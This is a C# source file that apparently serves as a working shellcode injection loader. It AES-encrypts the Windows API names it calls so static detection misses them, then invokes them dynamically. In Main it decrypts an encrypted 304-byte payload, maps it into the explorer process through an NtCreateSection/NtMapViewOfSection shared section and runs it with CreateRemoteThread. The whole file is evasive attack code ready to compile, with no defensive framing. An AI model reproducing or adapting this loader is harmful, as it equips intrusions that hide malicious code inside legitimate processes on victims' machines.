using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace AES_Process_Injection_Dynamic_Invoke_Alternate
{
    class Program {

        static string GlobalKey = "uW2VRiWpxGFDLezetodQmXoq4MZDMmEStd1egJRKMDM=";
        static string GlobalIV = "3GSSSrPRO4taOe/x+BRMFA==";

        static byte[] dKernel32_dll_Bytes = new byte[16] { 0xCE, 0xA1, 0x86, 0xB8, 0xA9, 0x30, 0x18, 0xA0, 0x98, 0x0A, 0x45, 0x86, 0x7C, 0x59, 0xDA, 0x91 };
        static string dKernel32_dll = DecryptAESAsString(dKernel32_dll_Bytes, GlobalKey, GlobalIV);

        static byte[] dntdll_dll_Bytes = new byte[16] { 0x67, 0x0D, 0xC4, 0x9A, 0xA1, 0x11, 0x6A, 0x29, 0x8B, 0x20, 0x54, 0xA8, 0x55, 0xF3, 0xA1, 0xBD };
        static string dntdll_dll = DecryptAESAsString(dntdll_dll_Bytes, GlobalKey, GlobalIV);

        static byte[] dOpenProcess_Bytes = new byte[16] { 0x81, 0xE2, 0x71, 0x9F, 0xC2, 0x72, 0xA0, 0x02, 0x20, 0xCA, 0x43, 0x55, 0x00, 0xF0, 0xE2, 0xDB };
        static string dOpenProcess = DecryptAESAsString(dOpenProcess_Bytes, GlobalKey, GlobalIV);

        static byte[] dCreateRemoteThread_Bytes = new byte[32] { 0x7C, 0x0E, 0xCE, 0xED, 0x74, 0xE1, 0xC8, 0x74, 0x4A, 0xD2, 0x7F, 0xF4, 0xF2, 0xAC, 0xED, 0xF8, 0xCD, 0xEA, 0xC3, 0x23, 0x75, 0x71, 0x06, 0x15, 0x6A, 0x69, 0x86, 0x4C, 0x81, 0x48, 0x5F, 0x66 };
        static string dCreateRemoteThread = DecryptAESAsString(dCreateRemoteThread_Bytes, GlobalKey, GlobalIV);

        static byte[] dNtClose_Bytes = new byte[16] { 0x34, 0x8D, 0x64, 0x03, 0x5B, 0x0F, 0x42, 0xA0, 0x60, 0xCD, 0x0B, 0x6F, 0x36, 0x7C, 0xD8, 0xC1 };
        static string dNtClose = DecryptAESAsString(dNtClose_Bytes, GlobalKey, GlobalIV);

        static byte[] dNtCreateSection_Bytes = new byte[16] { 0x75, 0xED, 0x19, 0xF9, 0x92, 0x4E, 0x80, 0xB1, 0xAF, 0xE4, 0x26, 0x9E, 0xB9, 0xCB, 0x32, 0x8A };
        static string dNtCreateSection = DecryptAESAsString(dNtCreateSection_Bytes, GlobalKey, GlobalIV);

        static byte[] dNtMapViewOfSection_Bytes = new byte[32] { 0x4A, 0x7B, 0x7B, 0x71, 0x8F, 0x02, 0x5D, 0x59, 0x0A, 0x03, 0xF9, 0x8E, 0xE8, 0x32, 0x5E, 0xF4, 0x8F, 0x3C, 0x1D, 0x32, 0xC0, 0x92, 0x94, 0xA9, 0x5B, 0xF7, 0xB0, 0x35, 0x70, 0x98, 0x8B, 0x9F };
        static string dNtMapViewOfSection = DecryptAESAsString(dNtMapViewOfSection_Bytes, GlobalKey, GlobalIV);

        static byte[] dNtUnmapViewOfSection_Bytes = new byte[32] { 0x81, 0xC1, 0xB2, 0xEE, 0x67, 0x4E, 0x63, 0xC6, 0x24, 0x27, 0xBF, 0xD0, 0x81, 0xB5, 0x78, 0x54, 0xD3, 0xEF, 0x44, 0x2B, 0xD9, 0xD3, 0xEC, 0x25, 0xF4, 0x2F, 0x37, 0x8A, 0x68, 0x30, 0xB3, 0x3C };
        static string dNtUnmapViewOfSection = DecryptAESAsString(dNtUnmapViewOfSection_Bytes, GlobalKey, GlobalIV);


        public static object DynamicInvoke(Type returnType, string library, string methodName, object[] argumentTypes, Type[] parameterTypes) {
            var assemblyName = new AssemblyName("DynamicAssembly");
            var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            var moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");

            var methodBuilder = moduleBuilder.DefinePInvokeMethod(
                methodName,
                library,
                MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
                CallingConventions.Standard,
                returnType,
                parameterTypes,
                CallingConvention.Winapi,
                CharSet.Ansi
            );

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();
            MethodInfo dynamicMethod = moduleBuilder.GetMethod(methodName);

            return dynamicMethod.Invoke(null, argumentTypes);
        }
        public static IntPtr fOpenProcess(uint processAccess, bool bInheritHandle, uint processId) {
            var paramterTypes = new Type[] { typeof(uint), typeof(bool), typeof(uint) };
            var argumentTypes = new object[] { processAccess, bInheritHandle, processId };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dOpenProcess, argumentTypes, paramterTypes);
        }

        public static IntPtr fCreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId) {
            var paramterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr) };
            var argumentTypes = new object[] { hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dCreateRemoteThread, argumentTypes, paramterTypes);
        }

        public static UInt32 fNtCreateSection(ref IntPtr section, UInt32 desiredAccess, IntPtr pAttrs, ref long MaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile) {
            var parameterTypes = new Type[] { typeof(IntPtr).MakeByRefType(), typeof(UInt32), typeof(IntPtr), typeof(long).MakeByRefType(), typeof(UInt32), typeof(UInt32), typeof(IntPtr) };
            var argumentTypes = new object[] { section, desiredAccess, pAttrs, MaxSize, pageProt, allocationAttribs, hFile };
            UInt32 result = (UInt32)DynamicInvoke(typeof(UInt32), dntdll_dll, dNtCreateSection, argumentTypes, parameterTypes);

            section = (IntPtr)argumentTypes[0];
            MaxSize = (long)argumentTypes[3];

            return result;
        }

        public static UInt32 fNtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize, ref long SectionOffset, ref long ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect) {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(IntPtr).MakeByRefType(), typeof(IntPtr), typeof(IntPtr), typeof(long).MakeByRefType(), typeof(long).MakeByRefType(), typeof(uint), typeof(uint), typeof(uint) };
            var argumentTypes = new object[] { SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize, SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect };
            UInt32 result = (UInt32)DynamicInvoke(typeof(UInt32), dntdll_dll, dNtMapViewOfSection, argumentTypes, parameterTypes);

            BaseAddress = (IntPtr)argumentTypes[2];
            SectionOffset = (long)argumentTypes[5];
            ViewSize = (long)argumentTypes[6];

            return result;
        }

        public static uint fNtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr) {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr) };
            var argumentTypes = new object[] { hProc, baseAddr };
            return (uint)DynamicInvoke(typeof(uint), dntdll_dll, dNtUnmapViewOfSection, argumentTypes, parameterTypes);
        }

        public static int fNtClose(IntPtr hObject) {
            var parameterTypes = new Type[] { typeof(IntPtr) };
            var argumentTypes = new object[] { hObject };
            return (int)DynamicInvoke(typeof(int), dntdll_dll, dNtClose, argumentTypes, parameterTypes);
        }
        static int Main(string[] args) {
            byte[] Warhead_Bytes = new byte[304] { 0x4C, 0x1E, 0x97, 0x81, 0xBC, 0xCD, 0x36, 0x58, 0x72, 0xCF, 0x42, 0x97, 0x7B, 0x5C, 0x81, 0x9B, 0x44, 0x43, 0x03, 0x2D, 0x81, 0xF1, 0x2F, 0x14, 0xA8, 0xD8, 0xB6, 0x13, 0x1F, 0x03, 0xC0, 0xC9, 0x06, 0x45, 0xE6, 0x0D, 0x00, 0x2A, 0x77, 0xFE, 0x0A, 0xC0, 0x51, 0xF1, 0x93, 0x0C, 0x5E, 0x6E, 0x1B, 0xC9, 0x2F, 0x6D, 0xD4, 0x10, 0xDD, 0x2F, 0x75, 0x9A, 0xB5, 0x5B, 0x22, 0x7C, 0x52, 0xD2, 0xB8, 0xC7, 0x9B, 0x02, 0xAC, 0x7E, 0xBF, 0x68, 0x83, 0xF9, 0xBB, 0x82, 0xD1, 0x65, 0xFC, 0xEB, 0x7C, 0xDB, 0xC8, 0x92, 0xFB, 0x53, 0x57, 0xA6, 0x54, 0x3B, 0x35, 0x5A, 0x38, 0x80, 0x61, 0x55, 0xE2, 0xC8, 0xDD, 0xDA, 0x14, 0x33, 0xB5, 0x4B, 0xB8, 0x34, 0xAE, 0x1C, 0x1D, 0x7C, 0xA9, 0x48, 0x9E, 0xB3, 0xAE, 0x5E, 0x6F, 0xD3, 0xA4, 0xA7, 0x9B, 0x78, 0xB2, 0x78, 0x3A, 0xF2, 0xFD, 0xE8, 0x52, 0xD0, 0x9B, 0xB6, 0x02, 0x8B, 0xEE, 0xA9, 0xEF, 0x63, 0xE3, 0x1F, 0xFA, 0x2A, 0x85, 0x01, 0xF3, 0xA5, 0x3D, 0xD7, 0x55, 0x79, 0x4F, 0xB4, 0xAE, 0x8A, 0x4D, 0x43, 0x27, 0x6D, 0xB3, 0xBA, 0x73, 0x6A, 0x2C, 0xCF, 0xA6, 0x03, 0x7B, 0x40, 0xC1, 0xFE, 0xDA, 0x6C, 0x33, 0x59, 0xD5, 0x3E, 0xC5, 0xBD, 0x86, 0xCF, 0x76, 0xC1, 0xF0, 0xF1, 0x5A, 0x3F, 0x39, 0x92, 0xD7, 0xBA, 0x5F, 0xDA, 0xD8, 0x81, 0x78, 0xF6, 0x30, 0x18, 0x70, 0xA2, 0x04, 0x44, 0xD7, 0xA1, 0xFE, 0xED, 0x9E, 0xB6, 0x29, 0xAB, 0x7F, 0x9E, 0x77, 0xF5, 0xDA, 0x14, 0x7D, 0xB5, 0xDA, 0x42, 0x8A, 0xB2, 0x9F, 0x36, 0x70, 0xC5, 0x72, 0x13, 0x1D, 0x9C, 0xB6, 0xA2, 0xC2, 0x66, 0xE8, 0xE7, 0x84, 0xEB, 0x03, 0x46, 0x8D, 0x79, 0xB8, 0x28, 0x02, 0x09, 0xAB, 0xCB, 0xCC, 0x61, 0x30, 0xBA, 0xE7, 0x41, 0x23, 0x43, 0xC1, 0xBD, 0x02, 0xE2, 0xAB, 0x67, 0xAC, 0xB2, 0xC7, 0xC4, 0x56, 0x32, 0x67, 0x37, 0xBE, 0x18, 0x99, 0x8A, 0x59, 0x98, 0x0C, 0x8E, 0xA8, 0xFE, 0xAA, 0x29, 0xC9, 0x99, 0x2C, 0x1F, 0x63, 0x7D, 0x5C, 0x32, 0x9E, 0x37, 0xC2, 0xAE, 0xCE, 0x40, 0x77, 0xB9, 0x28, 0x86, 0x83, 0x6B, 0x3F, 0xDF };
            byte[] Warhead = DecryptAESAsBytes(Warhead_Bytes, "MeV1w5NXp6srqE5/qDN0lSLfu9J4opVHRcoYR1mmBzk=", "hTFZdUSVkNnMMRnI5uG36A==");

            long buffer_size = Warhead.Length;

            IntPtr ptr_section_handle = IntPtr.Zero;
            UInt32 create_section_status = fNtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40, 0x08000000, IntPtr.Zero);

            long local_section_offset = 0;
            IntPtr ptr_local_section_addr = IntPtr.Zero;
            IntPtr localProcess = new IntPtr( - 1);
            UInt32 local_map_view_status = fNtMapViewOfSection(ptr_section_handle, localProcess, ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x04);


            Marshal.Copy(Warhead, 0, ptr_local_section_addr, Warhead.Length);

            var process = Process.GetProcessesByName("explorer")[0];
            IntPtr hProcess = fOpenProcess(0x001F0FFF, false, (uint)process.Id);
            IntPtr ptr_remote_section_addr = IntPtr.Zero;
            UInt32 remote_map_view_status = fNtMapViewOfSection(ptr_section_handle, hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x20);

            fNtUnmapViewOfSection(localProcess, ptr_local_section_addr);
            fNtClose(ptr_section_handle);

            fCreateRemoteThread(hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);

            return 0;
        }

        static string DecryptAESAsString(byte[] data, string keyBase64, string ivBase64) {
            byte[] WarheadBytes = DecryptAESAsBytes(data, keyBase64, ivBase64);
            return Encoding.UTF8.GetString(WarheadBytes);
        }

        static byte[] DecryptAESAsBytes(byte[] data, string keyBase64, string ivBase64) {
            byte[] key = Convert.FromBase64String(keyBase64);
            byte[] iv = Convert.FromBase64String(ivBase64);

            using (Aes aes = Aes.Create()) {
                aes.Key = key;
                aes.IV = iv;

                using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                using (MemoryStream memoryStream = new MemoryStream(data))
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read)) {
                    byte[] WarheadBytes = new byte[data.Length];
                    int WarheadByteCount = cryptoStream.Read(WarheadBytes, 0, WarheadBytes.Length);

                    byte[] result = new byte[WarheadByteCount];
                    Array.Copy(WarheadBytes, result, WarheadByteCount);
                    return result;
                }
            }
        }
    }
}
